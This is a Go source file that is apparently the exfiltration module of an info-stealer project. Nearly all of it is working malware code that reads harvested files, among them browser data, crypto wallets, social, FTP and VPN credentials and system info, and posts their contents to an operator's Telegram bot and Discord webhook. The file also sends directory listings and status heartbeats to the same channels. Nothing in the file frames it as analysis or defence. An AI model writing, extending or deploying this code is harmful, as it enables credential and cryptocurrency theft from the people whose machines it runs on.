// ============================================================
// exfil.go - Data Exfiltration Module (FIXED DISCORD TIMEOUT)
// ============================================================
package exfil

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"github.com/RU7HL355/redtm/internal/core/browsers"
)

var (
	botToken        string
	chatID          string
	discordWebhook  string
	initialized     bool
)

// Init initializes the exfil module
func Init(token, chat, discord string) {
	botToken = token
	chatID = chat
	discordWebhook = discord
	initialized = true

	log.Println("📤 Exfil module initialized")
	
	if len(botToken) > 15 {
		log.Printf("   Token: %s...", botToken[:15])
	} else {
		log.Printf("   Token: %s", botToken)
	}
	log.Printf("   Chat ID: %s", chatID)
	
	if len(discordWebhook) > 30 {
		log.Printf("   Discord: %s...", discordWebhook[:30])
	} else {
		log.Printf("   Discord: %s", discordWebhook)
	}
}

// IsInitialized returns true if exfil module is ready
func IsInitialized() bool {
	return initialized && botToken != "" && chatID != ""
}

// ============================================================
// TELEGRAM FUNCTIONS
// ============================================================

// SendTelegram sends a message via Telegram
func SendTelegram(message string) bool {
	log.Println("📤 SendTelegram called")
	
	if len(botToken) > 10 {
		log.Printf("   BotToken: %s...", botToken[:10])
	} else {
		log.Printf("   BotToken: %s", botToken)
	}
	log.Printf("   ChatID: %s", chatID)
	log.Printf("   Message length: %d", len(message))

	if botToken == "" || chatID == "" {
		log.Println("⚠️ Telegram not configured (missing token or chat ID)")
		return false
	}

	// Truncate message if too long
	if len(message) > 4000 {
		message = message[:3997] + "..."
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)

	payload := map[string]string{
		"chat_id":    chatID,
		"text":       message,
		"parse_mode": "HTML",
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		log.Printf("❌ Failed to marshal Telegram payload: %v", err)
		return false
	}

	log.Printf("📤 Sending to: %s", url)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		log.Printf("❌ Failed to send Telegram message: %v", err)
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		log.Printf("❌ Telegram returned status: %d", resp.StatusCode)
		return false
	}

	log.Println("✅ Telegram message sent successfully")
	return true
}

// SendTelegramFile sends a file via Telegram
func SendTelegramFile(filePath, caption string) bool {
	if botToken == "" || chatID == "" {
		log.Println("⚠️ Telegram not configured")
		return false
	}

	fileData, err := ioutil.ReadFile(filePath)
	if err != nil {
		log.Printf("❌ Failed to read file: %v", err)
		return false
	}

	log.Printf("📁 Sending file: %s (%d bytes)", filePath, len(fileData))

	message := fmt.Sprintf("📁 File: %s\nSize: %d bytes\n(truncated for Telegram)",
		filePath, len(fileData))

	return SendTelegram(message)
}

// ============================================================
// DISCORD FUNCTIONS (FIXED - NON-BLOCKING)
// ============================================================

// SendDiscord sends a message via Discord
func SendDiscord(message string) bool {
	log.Println("📤 SendDiscord called")
	
	// Check if Discord is configured
	if discordWebhook == "" {
		log.Println("⚠️ Discord not configured - webhook URL is empty")
		return false
	}

	if len(message) > 1900 {
		message = message[:1897] + "..."
	}

	payload := map[string]string{
		"content": message,
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		log.Printf("❌ Failed to marshal Discord payload: %v", err)
		return false
	}

	log.Printf("📤 Sending Discord message to: %s...", discordWebhook[:50])

	// Use a channel to handle timeout
	resultChan := make(chan bool, 1)
	go func() {
		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Post(discordWebhook, "application/json", bytes.NewBuffer(jsonData))
		if err != nil {
			log.Printf("❌ Discord error: %v", err)
			resultChan <- false
			return
		}
		defer resp.Body.Close()
		
		if resp.StatusCode != 204 && resp.StatusCode != 200 {
			log.Printf("❌ Discord returned status: %d", resp.StatusCode)
			resultChan <- false
			return
		}
		
		log.Println("✅ Discord message sent successfully")
		resultChan <- true
	}()

	// Wait for result with timeout
	select {
	case result := <-resultChan:
		return result
	case <-time.After(5 * time.Second):
		log.Println("⚠️ Discord request timed out (5s)")
		return false
	}
}

// ============================================================
// HEARTBEAT FUNCTIONS
// ============================================================

// SendHeartbeat sends a heartbeat message
func SendHeartbeat(message string) bool {
	log.Printf("💓 Heartbeat: %s", message)

	// Try Telegram first
	telegramResult := SendTelegram("📡 " + message)

	// Try Discord as fallback (non-blocking)
	go SendDiscord("📡 " + message)

	return telegramResult
}

// ============================================================
// DATA COLLECTION AND SENDING
// ============================================================

// CollectAndSend collects all extracted data and sends it
func CollectAndSend() {
	log.Println("📤 CollectAndSend called")
	
	SendTelegram("🔍 DEBUG: CollectAndSend function called")

	if !IsInitialized() {
		log.Println("⚠️ Exfil module not initialized!")
		SendTelegram("❌ Exfil module not initialized!")
		return
	}

	SendTelegram("🔍 DEBUG: Exfil module initialized, looking for files...")

	// Get current directory
	currentDir, _ := os.Getwd()
	log.Printf("📁 Current directory: %s", currentDir)
	SendTelegram(fmt.Sprintf("📁 Current directory: %s", currentDir))

	// List all files in current directory
	files, err := ioutil.ReadDir(".")
	if err != nil {
		log.Printf("❌ Failed to list files: %v", err)
		SendTelegram(fmt.Sprintf("❌ Failed to list files: %v", err))
		return
	}
	
	fileList := "📁 Files in directory:\n"
	fileCount := 0
	for _, f := range files {
		if !f.IsDir() {
			fileList += fmt.Sprintf("  - %s (%d bytes)\n", f.Name(), f.Size())
			fileCount++
		}
	}
	if fileCount > 0 {
		SendTelegram(fileList)
	} else {
		SendTelegram("📁 No files found in current directory")
	}

	// Check for specific files
	relevantFiles := []string{
		"browser_data.json",
		"system_info.json",
		"wallets.json",
		"games.json",
		"socials.json",
		"common_files.json",
		"ftps.json",
		"vpns.json",
		"test.json",
	}

	foundFiles := 0
	for _, file := range relevantFiles {
		if _, err := os.Stat(file); err == nil {
			foundFiles++
			log.Printf("📁 Found: %s", file)
			SendTelegram(fmt.Sprintf("📁 Found: %s (%d bytes)", file, getFileSize(file)))

			data, err := ioutil.ReadFile(file)
			if err == nil {
				if len(data) < 4000 {
					message := fmt.Sprintf("📁 %s:\n%s", file, string(data))
					SendTelegram(message)
					go SendDiscord(message)
				} else {
					SendTelegram(fmt.Sprintf("📁 %s: %d bytes (sending as file)", file, len(data)))
					SendTelegramFile(file, "Extracted data")
				}
			}
			time.Sleep(1 * time.Second)
		}
	}

	if foundFiles == 0 {
		SendTelegram("⚠️ No data files found to exfiltrate.")
	}

	summary := fmt.Sprintf("✅ Exfil Complete\nFiles sent: %d\nTime: %s",
		foundFiles, time.Now().Format("2006-01-02 15:04:05"))
	SendHeartbeat(summary)

	log.Printf("✅ Exfil complete (%d files sent)", foundFiles)
}

// ============================================================
// BROWSER DATA FUNCTIONS
// ============================================================

// SendBrowserData sends browser data to Telegram/Discord
func SendBrowserData() bool {
	log.Println("📤 Sending browser data...")
	
	SendTelegram("🔍 DEBUG: SendBrowserData called")
	
	browserData := browsers.FormatBrowserData()
	
	// Send formatted data
	result1 := SendTelegram(browserData)
	go SendDiscord(browserData)
	
	// Also send JSON file if it exists
	if _, err := os.Stat("browser_data.json"); err == nil {
		SendTelegramFile("browser_data.json", "Browser Data JSON")
	}
	
	return result1
}

// ============================================================
// WALLET DATA FUNCTIONS
// ============================================================

// SendWalletData sends wallet data to Telegram/Discord
func SendWalletData() bool {
	log.Println("📤 Sending wallet data...")
	
	SendTelegram("🔍 DEBUG: SendWalletData called")
	
	if _, err := os.Stat("wallets.json"); err != nil {
		log.Println("⚠️ No wallet data found")
		SendTelegram("⚠️ No wallet data found")
		return false
	}
	
	data, err := ioutil.ReadFile("wallets.json")
	if err != nil {
		log.Printf("❌ Failed to read wallets.json: %v", err)
		return false
	}
	
	if len(data) < 4000 {
		message := fmt.Sprintf("💰 WALLET DATA:\n%s", string(data))
		SendTelegram(message)
		go SendDiscord(message)
	} else {
		SendTelegram("💰 Wallet data: " + fmt.Sprintf("%d bytes", len(data)))
		SendTelegramFile("wallets.json", "Wallet Data")
	}
	
	return true
}

// ============================================================
// SYSTEM INFO FUNCTIONS
// ============================================================

// SendSystemInfo sends system info to Telegram/Discord
func SendSystemInfo() bool {
	log.Println("📤 Sending system info...")
	
	SendTelegram("🔍 DEBUG: SendSystemInfo called")
	
	if _, err := os.Stat("system_info.json"); err != nil {
		log.Println("⚠️ No system info found")
		SendTelegram("⚠️ No system info found")
		return false
	}
	
	data, err := ioutil.ReadFile("system_info.json")
	if err != nil {
		log.Printf("❌ Failed to read system_info.json: %v", err)
		return false
	}
	
	if len(data) < 4000 {
		message := fmt.Sprintf("🖥️ SYSTEM INFO:\n%s", string(data))
		SendTelegram(message)
		go SendDiscord(message)
	} else {
		SendTelegram("🖥️ System info: " + fmt.Sprintf("%d bytes", len(data)))
		SendTelegramFile("system_info.json", "System Info")
	}
	
	return true
}

// ============================================================
// UTILITY FUNCTIONS
// ============================================================

// getFileSize returns the size of a file as a string
func getFileSize(filePath string) int64 {
	info, err := os.Stat(filePath)
	if err != nil {
		return 0
	}
	return info.Size()
}

// SendAllFiles sends all JSON files in the current directory
func SendAllFiles() {
	log.Println("📤 Sending all JSON files...")

	if !IsInitialized() {
		log.Println("⚠️ Exfil module not initialized!")
		SendTelegram("❌ Exfil module not initialized!")
		return
	}

	files, err := filepath.Glob("*.json")
	if err != nil {
		log.Printf("❌ Failed to list JSON files: %v", err)
		return
	}

	SendTelegram(fmt.Sprintf("📁 Found %d JSON files", len(files)))

	for _, file := range files {
		if _, err := os.Stat(file); err == nil {
			data, err := ioutil.ReadFile(file)
			if err == nil {
				if len(data) < 4000 {
					SendTelegram(fmt.Sprintf("📁 %s:\n%s", file, string(data)))
				} else {
					SendTelegram(fmt.Sprintf("📁 %s: %d bytes", file, len(data)))
					SendTelegramFile(file, "Extracted data")
				}
			}
			time.Sleep(1 * time.Second)
		}
	}
}

// SendCustomMessage sends a custom message to both channels
func SendCustomMessage(message string) bool {
	telegramResult := SendTelegram(message)
	go SendDiscord(message)
	return telegramResult
}

// GetStatus returns the current status of the exfil module
func GetStatus() string {
	status := "📤 Exfil Module Status\n"
	status += fmt.Sprintf("   Initialized: %v\n", initialized)
	status += fmt.Sprintf("   Bot Token: %s\n", maskString(botToken))
	status += fmt.Sprintf("   Chat ID: %s\n", chatID)
	status += fmt.Sprintf("   Discord: %s\n", maskString(discordWebhook))
	return status
}

// maskString masks a string for display
func maskString(s string) string {
	if len(s) == 0 {
		return "(empty)"
	}
	if len(s) > 15 {
		return s[:10] + "..."
	}
	return s
}

// SendDebug sends a debug message
func SendDebug(message string) bool {
	return SendTelegram("🔍 DEBUG: " + message)
}